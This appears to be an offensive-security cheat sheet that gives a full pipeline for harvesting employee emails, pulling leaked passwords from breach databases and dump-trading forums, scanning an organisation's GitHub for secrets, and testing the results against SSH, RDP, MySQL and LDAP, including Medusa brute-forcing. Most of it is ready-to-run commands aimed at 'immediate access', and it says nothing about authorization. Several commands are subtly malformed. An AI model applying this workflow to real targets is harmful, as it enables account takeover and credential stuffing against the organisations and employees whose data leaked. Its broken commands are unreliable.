# Rumors and Leaks: Intelligence from Past Exposures

Command reference for finding leaked credentials, exposed emails, and compromised accounts.

---

## Workflow Overview

**Main Objective:** Harvest leaked credentials and exposed intelligence to gain immediate access or valid authentication material.

**Algorithm:**

```
START: Have Domain & Email List from Previous Phases
    ↓
1. EMAIL ENUMERATION → Discover employee emails from domains/social sources
    ↓
2. CREDENTIAL DATABASES → Cross-reference emails against known breaches
    ↓
3. GITHUB LEAKS → Search public repos for hardcoded secrets/credentials
    ↓
4. SPECIALIZED PLATFORMS → Check targeted breach databases (industry-specific)
    ↓
5. MASS LOOKUPS → Batch check all discovered emails against leak databases
    ↓
6. CREDENTIAL VALIDATION → Test leaked credentials against live services
    ↓
END: Valid Credentials + Account Access + API Keys + Tokens
```

**How It Works:**

- **Email enumeration** builds target list from public sources
- **Credential databases** provide pre-compromised accounts (zero-click entry)
- **GitHub scanning** finds hardcoded secrets in public code
- **Specialized platforms** target industry-specific breaches
- **Mass lookups** automatically correlate multiple sources
- **Validation** confirms which credentials still work
- **Final result** immediate access without exploitation needed

---

## Helper Functions

**Add these to `.bashrc` or source as needed:**

```bash
# Email enumeration via theHarvester
harvesetemail(){
  theHarvester -d $1 -b all -f /tmp/harvest-$1.html
}

# Check single email against leak-lookup
checkleak(){
  curl -s "https://api.leak-lookup.com/v1/check?key=YOUR_API_KEY&type=email_address&query=$1"
}

# Check email against dehashed
checkdehashed(){
  curl -s "https://api.dehashed.com/search?query=$1" \
    -u "YOUR_EMAIL:YOUR_KEY"
}

# Hunter.io email search
hunteremail(){
  curl -s "https://api.hunter.io/v2/domain-search?domain=$1&domain=$2&limit=100&api_key=YOUR_API_KEY"
}

# Batch email check from file
batchleak(){
  while read email; do
    echo "=== Checking $email ==="
    checkleak "$email"
  done < $1
}

# GitHub org credential scan
githubleakscan(){
  leakos -o $1 -l
}

# Snov.io bulk lookup
snovlookup(){
  curl -X POST "https://api.snov.io/v1/users/search" \
    -H "Content-Type: application/json" \
    -d "{\"domain\":\"$1\",\"limit\":100}" \
    -H "Authorization: Bearer YOUR_TOKEN"
}
```

---

## 1. Email Enumeration

**theHarvester (multiple sources):**

```bash
theHarvester -d example.com -b all -f harvest-report.html
theHarvester -d example.com -b google,hunter,bing,linkedin -f results.html
```

**Hunter.io API (free version - 100 requests/month):**

```bash
# Domain search
curl "https://api.hunter.io/v2/domain-search?domain=example.com&limit=100&api_key=YOUR_KEY"

# Single email verification
curl "https://api.hunter.io/v2/email-verifier?email=test@example.com&api_key=YOUR_KEY"
```

**Snov.io API (free version):**

```bash
curl -X POST "https://api.snov.io/v1/users/search" \
  -H "Content-Type: application/json" \
  -d "{\"domain\":\"example.com\",\"limit\":100}" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

**Minelead.io API (free version):**

```bash
curl "https://api.minelead.io/search?domain=example.com&key=YOUR_API_KEY"
```

---

## 2. Credential Leak Databases

**leak-lookup.com API (check single email/password):**

```bash
# Email breach check
curl "https://api.leak-lookup.com/v1/check?key=YOUR_API_KEY&type=email_address&query=user@example.com"

# Username check
curl "https://api.leak-lookup.com/v1/check?key=YOUR_API_KEY&type=username&query=admin"
```

**Dehashed API (detailed breach information):**

```bash
# Basic email lookup
curl "https://api.dehashed.com/search?query=user@example.com" \
  -u "YOUR_EMAIL:YOUR_API_KEY"

# Specific breach search
curl "https://api.dehashed.com/search?query=example.com&type=email" \
  -u "YOUR_EMAIL:YOUR_API_KEY"
```

**Have I Been Pwned API (free, no key needed):**

```bash
# Check if email in any known breach
curl "https://haveibeenpwned.com/api/v3/breachedaccount/user@example.com" \
  -H "User-Agent: Mozilla/5.0"

# Get breaches for that account
curl "https://haveibeenpwned.com/api/v3/breaches" -H "User-Agent: Mozilla/5.0"
```

---

## 3. GitHub Credential Leaks

**Leakos (automated repo scanning):**

```bash
# Download all public repos from organization + scan with gitleaks
leakos -o TargetOrg -l

# Scan specific repositories
leakos -r TargetOrg/repo1 TargetOrg/repo2 -l
```

**Gitleaks on cloned repos:**

```bash
# Clone all org public repos
git clone https://github.com/TargetOrg/repo1
git clone https://github.com/TargetOrg/repo2

# Scan with gitleaks
gitleaks detect -r repo1 -v
gitleaks detect -r repo2 -v
```

**Search GitHub directly:**

```bash
# Search for passwords in org repos
curl -s "https://api.github.com/search/code?q=org:TargetOrg+password" | jq

# Search for API keys
curl -s "https://api.github.com/search/code?q=org:TargetOrg+api_key" | jq

# Search for AWS credentials
curl -s "https://api.github.com/search/code?q=org:TargetOrg+AKIA" | jq
```

---

## 4. Specialized Leak Platforms

**Manual breach databases:**

- https://breachdirectory.com/ → Search email across multiple breaches
- https://www.breachcompilation.com/ → Compilation of public breaches
- https://cracked.to/ → Forum with leaked database compilations
- https://leakcheck.net/ → Email/username/hash lookup
- https://www.snusbase.com/ → Aggregated breach data
- https://dumpsbuy.com/ → Dumps aggregator

---

## 5. Mass Credential Lookups

**Batch check email list against leak-lookup:**

```bash
while read email; do
  echo "=== Checking $email ==="
  curl -s "https://api.leak-lookup.com/v1/check?key=YOUR_KEY&type=email_address&query=$email" | jq '.found'
done < emails.txt | tee leak-results.txt
```

**Batch check against Dehashed:**

```bash
for email in $(cat emails.txt); do
  curl -s "https://api.dehashed.com/search?query=$email" \
    -u "YOUR_EMAIL:YOUR_KEY" | jq '.entries[0] | "\(.username):\(.password)"'
done | tee credentials.txt
```

**Batch HIBP check:**

```bash
while read email; do
  echo -n "$email: "
  curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" \
    -H "User-Agent: Mozilla/5.0" | jq '.name' 2>/dev/null || echo "Not found"
  sleep 1.5  # HIBP rate limit
done < emails.txt
```

---

## 6. Credential Validation

**Test credentials against common services (SSH/RDP/SQL):**

```bash
# SSH login test
sshpass -p "password" ssh user@192.168.1.10 "whoami"

# RDP connection test
xfreerdp /u:user /p:password /v:192.168.1.10

# MySQL login test
mysql -u user -p "password" -h 192.168.1.10 -e "SELECT VERSION();"

# LDAP binding test
ldapwhoami -h 192.168.1.10 -D "cn=user,dc=example,dc=com" -w "password"
```

**Parallel credential testing (Medusa):**

```bash
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -T 10
medusa -H 192.168.1.0/24 -U users.txt -P passwords.txt -M mysql
```

---

## Quick Workflows

**Complete email to leaked credentials pipeline:**

```bash
# 1. Harvest emails from domain
theHarvester -d example.com -b all -f harvest.html

# 2. Extract emails from HTML
grep -oE "[a-zA-Z0-9._%+-]+@example\.com" harvest.html | sort -u | tee emails.txt

# 3. Check all emails against leak databases
while read email; do
  echo "=== $email ==="
  curl -s "https://api.leak-lookup.com/v1/check?key=KEY&type=email_address&query=$email"
done < emails.txt | tee breach-results.txt

# 4. Extract valid credentials
grep -B1 "\"found\": true" breach-results.txt | tee valid-leaks.txt
```

**GitHub organization leak hunting:**

```bash
# 1. Clone and scan all public repos
leakos -o TargetOrg -l -o /tmp/repos

# 2. Extract findings
find /tmp/repos -name ".gitleaks.json" -exec cat {} \; | jq '.[] | "\(.File):\(.Line)"' | tee github-secrets.txt

# 3. Validate credentials found
while read secret; do
  echo "Testing: $secret"
  # Attempt to use secret against live services
done < github-secrets.txt
```

**Mass email enumeration and breach checking:**

```bash
# 1. Enumerate emails from multiple domains
for domain in $(cat domains.txt); do
  theHarvester -d $domain -b hunter -l 100 -f harvest-$domain.html
done

# 2. Extract all emails
grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" harvest-*.html | \
  sort -u | tee all-emails.txt

# 3. Batch HIBP check with rate limiting
while read email; do
  curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" \
    -H "User-Agent: Mozilla/5.0" -o /tmp/hibp-$email.json
  sleep 2
done < all-emails.txt

# 4. Summarize breaches
find /tmp/hibp-*.json -exec cat {} \; | jq '.Name' | sort | uniq -c | sort -rn
```

---

